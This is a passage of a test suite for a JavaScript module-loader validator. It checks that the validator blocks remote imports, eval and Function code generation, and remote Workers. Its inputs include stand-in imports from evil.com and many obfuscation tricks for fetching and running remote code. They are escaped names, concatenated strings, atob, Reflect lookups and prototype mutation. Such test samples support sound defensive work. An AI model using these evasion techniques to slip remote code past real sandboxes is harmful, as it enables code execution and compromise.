import "#veryfront/schemas/_test-setup.ts";
import { assertEquals, assertRejects } from "#veryfront/testing/assert.ts";
import { describe, it } from "#veryfront/testing/bdd.ts";
import {
  collectLocalWorkerSpecifiers,
  extractModuleSpecifiers,
  scanModuleSpecifiers,
  validateHTTPImports,
} from "./http-validator.ts";
import { __setSourceCapabilityParserLoaderForTests } from "./source-capability-analyzer.ts";

describe("routing/api/module-loader/http-validator", () => {
  describe("validateHTTPImports", () => {
    it("should block all remote imports when allowedHosts is empty", async () => {
      await assertRejects(
        async () => await validateHTTPImports('import foo from "https://evil.com/lib.js";', []),
        Error,
        "Remote import blocked",
      );
    });

    it("should block bare side-effect remote imports when allowedHosts is empty", async () => {
      await assertRejects(
        async () => await validateHTTPImports('import "https://evil.com/x.js";', []),
        Error,
        "Remote import blocked",
        "a side-effect-only remote import must still be blocked by the allow-list",
      );
    });

    it("should reject an http:// URL for an https-only allowed host", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import x from "http://esm.sh/react";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
        "an http:// URL must not satisfy an https-only allowed host",
      );
    });

    it("should reject an off-port URL for an allowed host", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import x from "https://esm.sh:8443/react";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
        "a non-default port must not satisfy an allowed host pinned to the default port",
      );
    });

    it("should block remote re-exports that are not allow-listed", async () => {
      await assertRejects(
        async () => await validateHTTPImports('export { pwn } from "https://evil.com/x.js";', []),
        Error,
        "Remote import blocked",
        "a named re-export is a remote import and must be blocked",
      );
      await assertRejects(
        async () => await validateHTTPImports('export * from "https://evil.com/x.js";', []),
        Error,
        "Remote import blocked",
        "a star re-export is a remote import and must be blocked",
      );
    });

    it("should allow remote re-exports from allowed hosts", async () => {
      await validateHTTPImports('export { a } from "https://esm.sh/x.js";', [
        "https://esm.sh",
      ]);
      await validateHTTPImports('export * from "https://esm.sh/x.js";', ["https://esm.sh"]);
    });

    it("should ignore remote re-export text inside strings and comments", async () => {
      await validateHTTPImports(
        [
          `const example = 'export * from "https://evil.com/x.js";';`,
          `// export { pwn } from "https://evil.com/y.js";`,
          `export { ok } from "https://esm.sh/ok.js";`,
        ].join("\n"),
        ["https://esm.sh"],
      );
    });

    it("should allow imports from allowed hosts", async () => {
      await validateHTTPImports('import React from "https://esm.sh/react@18";', [
        "https://esm.sh",
      ]);
    });

    it("should reject imports from non-allowed hosts", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import malware from "https://evil.com/bad.js";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject prefix-domain bypasses of allowed hosts", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('import malware from "https://esm.sh.evil.example/bad.js";', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should check dynamic imports", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports('const mod = import("https://evil.com/mod.js");', [
            "https://esm.sh",
          ]);
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject unconstrained dynamic imports", async () => {
      await assertRejects(
        async () => await validateHTTPImports(`const load = (url: string) => import(url);`, []),
        Error,
        "unconstrained dynamic import",
      );
    });

    it("should reject inline module URLs", async () => {
      for (const specifier of ["data:text/javascript,export default 1", "blob:null/id"]) {
        await assertRejects(
          async () => await validateHTTPImports(`import ${JSON.stringify(specifier)};`, []),
          Error,
          "inline module URLs",
        );
      }
    });

    it("should check multiline static imports", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports(
            [
              `import {`,
              `  value,`,
              `} from "https://evil.com/mod.js";`,
            ].join("\n"),
            ["https://esm.sh"],
          );
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should decode escaped remote import specifiers before validation", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports(
            String.raw`import "https:\x2f\x2fevil.com/mod.js";`,
            ["https://esm.sh"],
          );
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject uppercase remote schemes through the same allow-list", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports('import "HTTPS://evil.com/mod.js";', ["https://esm.sh"]),
        Error,
        "Remote import blocked",
      );
    });

    it("should not leak RangeError for an out-of-range Unicode escape", async () => {
      const scan = scanModuleSpecifiers(String.raw`import "\u{110000}";`);

      assertEquals(scan.specifiers, []);
    });

    it("should check dynamic imports inside template interpolations", async () => {
      await assertRejects(
        async () => {
          await validateHTTPImports(
            [
              "const rendered = `prefix ${",
              `  await import("https://evil.com/mod.js")`,
              "} suffix`;",
            ].join("\n"),
            ["https://esm.sh"],
          );
        },
        Error,
        "Remote import blocked",
      );
    });

    it("should reject dynamic code generation before module evaluation", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(`const load = eval('import("https://evil.com/mod.js")');`, []),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = new Function('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
    });

    it("should reject computed dynamic code generation before module evaluation", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = globalThis["ev" + "al"]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = globalThis["Fun" + "ction"]('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = globalThis["eva" + "l"]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const load = (() => {}).constructor('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Constructor = (() => {}).constructor; const load = Constructor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { constructor: Constructor } = (() => {}); const load = Constructor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
    });

    it("should reject reflective retrieval of a dynamic code generator", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = Reflect.get(globalThis, "ev" + "al"); run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a generator name rejoined from concatenated literals must still be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const make = Reflect.get(globalThis, "Fun" + "ction"); make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a reflectively retrieved Function constructor must still be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Ctor = Reflect.get(() => {}, "const" + "ructor"); Ctor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a reflectively retrieved constructor must still be rejected",
      );
    });

    it("should reject a generator name hidden in a single escaped string literal", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = Reflect.get(globalThis, "\\x65val"); run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside one literal still resolves to eval and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const make = Reflect.get(globalThis, "\\x46unction"); make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside one literal still resolves to Function and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = globalThis["\\u{65}val"]; run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a code-point escape inside one literal still resolves to eval and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Ctor = Reflect.get(() => {}, "\\x63onstructor"); Ctor('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside one literal still resolves to constructor and must be rejected",
      );
    });

    it("should reject a generator name hidden in a template literal", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            "const run = Reflect.get(globalThis, `\\x65val`); run(payload);",
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\xNN escape inside a template literal still resolves to eval and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            "const make = globalThis[`\\x46unction`]; make(payload)();",
            [],
          ),
        Error,
        "dynamic code generation",
        "a template literal computes a global property just as a quoted one does",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            "const run = Reflect.get(globalThis, `ev` + `al`); run(payload);",
            [],
          ),
        Error,
        "dynamic code generation",
        "a generator name rejoined from concatenated templates must still be rejected",
      );
    });

    it("should reject a global property read under a name it cannot resolve", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = ["e", "v", "a", "l"].join(""); const run = globalThis[name];` +
              ` run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a runtime-computed global property may resolve to eval and must not pass as inert",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = atob("ZXZhbA=="); const run = globalThis?.[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an optional-chained global read hides the same lookup and must be rejected too",
      );
    });

    it("should reject a computed global read through an alias of the global object", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = g[name]; run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "aliasing globalThis must not hide a runtime-computed generator lookup",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis; const h = g; const run = h[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an alias of an alias of the global object hides the same lookup",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const run = self[name]; run('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "self references the global object, so a computed read off it must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis.self; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = g[name]; run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a global-object property that returns the global object must remain a global alias",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let g; g ||= globalThis; const name = ["e", "v", "a", "l"].join("");` +
              ` g[name]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "logical assignment must retain the capability carried by its right-hand side",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const g = globalThis.valueOf(); const name = ["e", "v", "a", "l"].join("");` +
              ` g[name]('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "global valueOf returns the same capability-bearing object",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const R = Reflect; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = R.get(globalThis, name); run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "aliasing Reflect must not hide an undecidable read from the global object",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const read = (object: Record<string, unknown>, key: string) => object[key];` +
              ` const g = globalThis; const run = read(g, "eval");`,
            [],
          ),
        Error,
        "dynamic code generation",
        "passing a global-object alias to code this local analysis cannot follow must fail closed",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { get } = Reflect; const name = ["e", "v", "a", "l"].join("");` +
              ` const run = get(globalThis, name); run(payload);`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a destructured reflective getter must not make a computed global read safe",
      );
    });

    it("should ignore inert generator names and locally bound identifiers", async () => {
      const cases = [
        `type Handler = Function; export const GET: Handler = () => new Response("ok");`,
        `const Function = () => "local"; export const GET = () => new Response(Function());`,
        `export const label = "Function"; export const GET = () => new Response(label);`,
        `// eval and Function are mentioned only in documentation\nexport const GET = () => new Response("ok");`,
        `const metadata = { constructor: "ordinary" };` +
        ` export const GET = () => new Response(metadata.constructor);`,
        `const note = "const g = globalThis"; const g = { safe: "ok" };` +
        ` const name = "safe"; export const GET = () => new Response(g[name]);`,
      ];

      for (const source of cases) {
        await validateHTTPImports(source, []);
      }
    });

    it("should reject constructor reads from object literals with a custom prototype", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = { __proto__: () => {} }; const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an object literal prototype setter can replace constructor with executable code",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; Object.setPrototypeOf(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a later prototype mutation invalidates the plain-object constructor exemption",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; Reflect.set(holder, "__proto__", () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Reflect.set can invoke the inherited prototype setter too",
      );
    });

    it("should reject static constructor keys in destructuring", async () => {
      for (
        const pattern of [
          `const { "constructor": Make } = () => {};`,
          `const { ["con" + "structor"]: Make } = () => {};`,
        ]
      ) {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `${pattern} Make('return import("https://evil.com/mod.js")')();`,
              [],
            ),
          Error,
          "dynamic code generation",
          "quoted and computed static keys obtain the same Function constructor",
        );
      }
    });

    it("should allow reflective reads that cannot expose a code generator", async () => {
      await validateHTTPImports(
        `const value = Reflect.get(someObject, "value"); export const GET = () => value;`,
        [],
      );
      await validateHTTPImports(
        `const c = Reflect.get(globalThis, "crypto"); export const GET = () => c;`,
        [],
      );
    });

    it("should reject a dynamic Reflect.get key on an unproven target", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const name = ["con", "str", "uctor"].join("");` +
              ` const make = Reflect.get(() => {}, name);` +
              ` make('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an unresolved reflective key may select a callable target constructor",
      );
    });

    it("should reject a computed property read this analysis cannot resolve on a callable", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const fn = () => {}; const key = ["con", "structor"].join("");` +
              ` const make = fn[key];` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an undecidable computed key on a function may spell constructor and reach Function",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `function helper() {} const key = atob("Y29uc3RydWN0b3I=");` +
              ` helper[key]('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a function declaration binding carries the same constructor property",
      );
      await validateHTTPImports(
        `const table = { safe: "ok" }; const key = computeKey();` +
          ` export const GET = () => new Response(String(table[key]));`,
        [],
      );
    });

    it("should track prototype mutations through aliases of Object and Reflect", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const O = Object; const holder = {}; O.setPrototypeOf(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an alias of Object reaches the same prototype mutator",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const R = Reflect; const holder = {};` +
              ` R.set(holder, "__proto__", () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an alias of Reflect reaches the same prototype setter",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const holder = {}; globalThis.Object.setPrototypeOf(holder, () => {});` +
              ` const make = holder.constructor;` +
              ` make('return import("https://blocked.example/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "Object read off the global object is the same prototype mutator",
      );
    });

    it("should reject imports of runtime modules that evaluate source text", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import { runInThisContext } from "node:vm";` +
              ` runInThisContext('new Worker("https://blocked.example/mod.js", { type: "module" })');`,
            [],
          ),
        Error,
        "code evaluation",
        "node:vm evaluates strings this validator can never scan as code",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const vm = await import("node:vm"); export const GET = () => new Response(String(vm));`,
            [],
          ),
        Error,
        "code evaluation",
        "a dynamic import reaches the same evaluator",
      );
    });

    it("should reject imports of runtime module loaders such as createRequire", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import { createRequire } from "node:module";` +
              ` const require = createRequire(import.meta.url);` +
              ` export const value = require("./helper.cjs");`,
            [],
          ),
        Error,
        "createRequire",
        "a createRequire load never appears in the module graph this validator walks",
      );
    });

    it("should not treat erased TypeScript declarations as runtime bindings", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import type { Function } from "./types.ts";` +
              ` const run = Function('return import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a type-only import is erased and leaves the global Function constructor live",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `declare const Worker: unknown; new Worker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "a declare binding is erased and cannot shadow the global Worker constructor",
      );
    });

    it("should treat namespace bodies and enum members as executable code", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `namespace RouteNs { eval('import("https://blocked.example/mod.js")'); }`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a namespace body compiles to executable JavaScript, not to an erased type",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `namespace RouteNs {` +
              ` export const w = new Worker("https://blocked.example/mod.js", { type: "module" });` +
              ` }`,
            [],
          ),
        Error,
        "Worker",
        "a remote worker inside a namespace starts exactly as one at the top level does",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `namespace RouteNs { export const load = (u: string) => import(u); }`,
            [],
          ),
        Error,
        "unconstrained dynamic import",
        "a dynamic import inside a namespace escapes no differently",
      );
      await assertRejects(
        async () => await validateHTTPImports(`enum RouteEnum { A = eval("1") }`, []),
        Error,
        "dynamic code generation",
        "a computed enum member initializer executes at module evaluation",
      );
      // Ambient declarations stay erased, and ordinary namespace and enum
      // values keep loading.
      await validateHTTPImports(
        `declare namespace Ambient { const value: number; }` +
          ` namespace SafeNs { export const value = 1; }` +
          ` enum SafeEnum { A = 1, B = A * 2 }` +
          ` export const GET = () => new Response(String(SafeNs.value + SafeEnum.B));`,
        [],
      );
    });

    it("should not let loop-local bindings shadow global capabilities outside the loop", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `for (let Function of []) { void Function; }` +
              ` Function('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `for (let Worker of []) { void Worker; }` +
              ` new Worker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
      );
    });

    it("should reject a Worker that loads a remote or non-literal module URL", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a module worker fetching a remote URL bypasses the allow-list and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker("https://esm.sh/mod.js", { type: "module" });`,
            ["https://esm.sh"],
          ),
        Error,
        "Worker",
        "even an allow-listed origin is unconstrainable through a worker loader and must be rejected",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const url = resolveWorker(); const w = new Worker(url, { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a non-literal worker URL cannot be scanned and must fail closed",
      );
    });

    it("should reject remote Workers reached through global constructor aliases", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const RouteWorker = Worker; new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "aliasing the global Worker constructor must not bypass URL validation",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new globalThis.Worker("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "the Worker constructor exposed through the global object is the same loader",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const RouteWorker = Reflect.get(globalThis, "Wor" + "ker");` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "reflective retrieval of the global Worker constructor must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { Worker: RouteWorker } = globalThis;` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "destructuring the global Worker constructor must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const { ["Wor" + "ker"]: RouteWorker } = globalThis;` +
              ` new RouteWorker("https://blocked.example/mod.js");`,
            [],
          ),
        Error,
        "Worker",
        "a computed destructuring key must retain Worker URL checks",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const RouteWorker = Worker;` +
              ` Reflect.construct(RouteWorker, ["https://blocked.example/mod.js", { type: "module" }]);`,
            [],
          ),
        Error,
        "Worker",
        "reflective construction must not bypass Worker URL validation",
      );
    });

    it("should classify a Worker constructor assigned in the construction itself", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new (W = Worker)("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "an assignment expression callee evaluates to its right-hand side, the Worker loader",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `let W; new (W = Worker)("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a declared assignment target must not hide the construction either",
      );
    });

    it("should fail closed on Worker aliases when the capability parser is unavailable", async () => {
      __setSourceCapabilityParserLoaderForTests(() =>
        Promise.reject(new Error("parser unavailable"))
      );
      try {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `const RouteWorker = Worker; new RouteWorker(remoteUrl);`,
              [],
            ),
          Error,
          "Worker",
          "the textual fallback must not accept an alias it cannot classify",
        );
      } finally {
        __setSourceCapabilityParserLoaderForTests();
      }
    });

    it("should not exempt global arguments passed to a shadowed Reflect", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const Reflect = { get: (value: typeof globalThis) => value.Worker };` +
              ` const W = Reflect.get(globalThis);` +
              ` new W("https://blocked.example/mod.js", { type: "module" });`,
            [],
          ),
        Error,
        "dynamic code generation",
        "passing the global object to arbitrary local code must fail closed",
      );
    });

    it("should ignore inert Worker text and locally bound constructors", async () => {
      await validateHTTPImports(
        `const note = 'new Worker("https://blocked.example/mod.js")';\n` +
          'const template = `new Worker("https://blocked.example/template.js")`;\n' +
          `const pattern = /new Worker\\("https:\\/\\/blocked\\.example\\/regex\\.js"\\)/;\n` +
          `// new Worker("https://blocked.example/comment.js");\n` +
          `export const GET = () => new Response(note + template + pattern.source);`,
        [],
      );
      await validateHTTPImports(
        `class Worker { constructor(_value: string) {} }` +
          ` const local = new Worker("https://blocked.example/mod.js");` +
          ` export const GET = () => new Response(String(local));`,
        [],
      );
      await validateHTTPImports(
        `const Thing = getThing(); const local = new Thing("https://blocked.example/mod.js");`,
        [],
      );
      await validateHTTPImports(
        `const RouteWorker = globalThis.Worker; new RouteWorker("./worker.ts");`,
        [],
      );
    });

    it("should accept a Worker that loads a local module URL", async () => {
      await validateHTTPImports(
        `const w = new Worker(new URL("./worker.ts", import.meta.url), { type: "module" });`,
        [],
      );
      await validateHTTPImports(`const w = new Worker("./worker.ts", { type: "module" });`, []);
      await validateHTTPImports(
        `const { Worker: RouteWorker } = globalThis; new RouteWorker("./worker.ts");`,
        [],
      );
    });

    it("should reject a Worker whose relative URL resolves against a remote base", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker(new URL("./mod.js", "https://blocked.example/"), { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a relative worker specifier lands wherever its base points, so a remote base is a remote worker",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `const w = new Worker(new URL("./mod.js", baseUrl), { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
        "a base this scanner cannot read leaves the worker URL unknown and must fail closed",
      );
    });

    it("should reject file-scheme Worker entries the project walk cannot contain", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new Worker("file:///outside/project/worker.ts", { type: "module" });`,
            [],
          ),
        Error,
        "Worker",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `new Worker(new URL("./worker.ts", "file:///outside/project/"));`,
            [],
          ),
        Error,
        "Worker",
      );
    });

    it("should fail closed on literal worker bases the textual scanner does not resolve", async () => {
      __setSourceCapabilityParserLoaderForTests(() =>
        Promise.reject(new Error("parser unavailable"))
      );
      try {
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `new Worker(new URL("./mod.js", " https://evil.example/base/"), { type: "module" });`,
              [],
            ),
          Error,
          "Worker",
          "the URL constructor trims the base and fetches remotely, so a padded base must not scan as local",
        );
        await assertRejects(
          async () =>
            await validateHTTPImports(
              `new Worker(new URL("./mod.js", "./base/"), { type: "module" });`,
              [],
            ),
          Error,
          "Worker",
          "a relative base names an entry no graph walk can vet and must not pass validation",
        );
      } finally {
        __setSourceCapabilityParserLoaderForTests();
      }
    });

    it("should record only the worker entries whose base resolves against this module", async () => {
      assertEquals(
        await collectLocalWorkerSpecifiers(
          `const a = new Worker(new URL("./a.ts", import.meta.url)); const b = new Worker("./b.ts");`,
        ),
        ["./a.ts", "./b.ts"],
        "a caller vetting the graph needs the entry each local worker executes",
      );
      assertEquals(
        await collectLocalWorkerSpecifiers(
          `const w = new Worker(new URL("./mod.js", "file:///elsewhere/"));`,
        ),
        [null],
        "a local base this scanner does not follow gives no specifier the graph walk can resolve",
      );
      assertEquals(
        await collectLocalWorkerSpecifiers(`export const GET = () => new Response("ok");`),
        [],
        "a handler that starts no worker contributes no entries",
      );
    });

    it("should read the module clause past an import binding named from", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `import { from as value } from "https://blocked.example/mod.js";\nexport const GET = () => value;`,
            [],
          ),
        Error,
        "blocked.example",
        "`from` is a legal binding name, and the real module clause must still be allow-listed",
      );
      assertEquals(
        extractModuleSpecifiers(
          `import { from as value } from "https://esm.sh/mod.js";`,
        ),
        ["https://esm.sh/mod.js"],
        "the specifier follows the module clause, not the first contextual `from`",
      );
    });

    it("should not read a keyword out of a name ending in non-ASCII letters", async () => {
      const source = `const caf\u00e9import = (value) => value;\n` +
        `export const GET = () => caf\u00e9import("https://blocked.example/value");`;
      await validateHTTPImports(source, []);
      assertEquals(
        extractModuleSpecifiers(source),
        [],
        "`import` inside an identifier is part of the name, so its call argument is no specifier",
      );
    });

    it("should still accept a global property read under a name it can resolve", async () => {
      const source = `const subtle = globalThis["crypto"]; export const GET = () => subtle;`;
      await validateHTTPImports(source, []);
      assertEquals(
        scanModuleSpecifiers(source).hasDynamicCodeGeneration,
        false,
        "a literal property name resolves to a harmless global and must keep loading",
      );
    });

    it("should still accept template literals that name no generator", async () => {
      const source =
        "export const page = `<p>${title}</p>`; export const note = `\\x65valuation harness`;";
      await validateHTTPImports(source, []);
      assertEquals(
        scanModuleSpecifiers(source).hasDynamicCodeGeneration,
        false,
        "an interpolated template and an escape that decodes to a non-generator word must both be accepted",
      );
    });

    it("should still accept escaped string literals that name no generator", async () => {
      await validateHTTPImports(
        `export const label = "\\x65valuation harness"; export const flag = "\\u0063onstruct";`,
        [],
      );
      assertEquals(
        scanModuleSpecifiers(
          `export const label = "\\x65valuation harness"; export const flag = "\\u0063onstruct";`,
        ).hasDynamicCodeGeneration,
        false,
        "an escape that decodes to a non-generator word must not be reported as dynamic code generation",
      );
    });

    it("should reject a dynamic code generator spelled with identifier escapes", async () => {
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `globalThis.\\u0065val('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a \\uXXXX escape binds eval and must be decoded before the generator scan",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `globalThis.\\u{65}val('import("https://evil.com/mod.js")');`,
            [],
          ),
        Error,
        "dynamic code generation",
        "a code-point escape binds eval and must be decoded before the generator scan",
      );
      await assertRejects(
        async () =>
          await validateHTTPImports(
            `globalThis.\\u0046unction('return import("https://evil.com/mod.js")')();`,
            [],
          ),
        Error,
        "dynamic code generation",
        "an escaped Function reference must be decoded before the generator scan",
      );
    });

    it("should ignore ordinary member calls named import", async () => {
      await validateHTTPImports(
        `const value = client.import("https://evil.com/not-a-module.js");`,
        ["https://esm.sh"],
      );
      await validateHTTPImports(
        `const value = client?.import("https://evil.com/not-a-module.js");`,
        ["https://esm.sh"],
      );
      await validateHTTPImports(
        `class Client { #import = (_url: string) => "private"; value() { return this.#import("https://evil.com/not-a-module.js"); } }`,
        ["https://esm.sh"],
      );
    });

    it("should allow fully static dynamic imports with import attributes", async () => {
      await validateHTTPImports(
        `const mod = await import("https://esm.sh/data.json", { with: { type: "json" } });`,
        ["https://esm.sh"],
      );
    });

    it("should ignore private member calls named import", async () => {
      await validateHTTPImports(
        [
          `class Client {`,
          `  #import(url: string) { return url; }`,
          `  load() { return this.#import("https://evil.com/not-a-module.js"); }`,
          `}`,
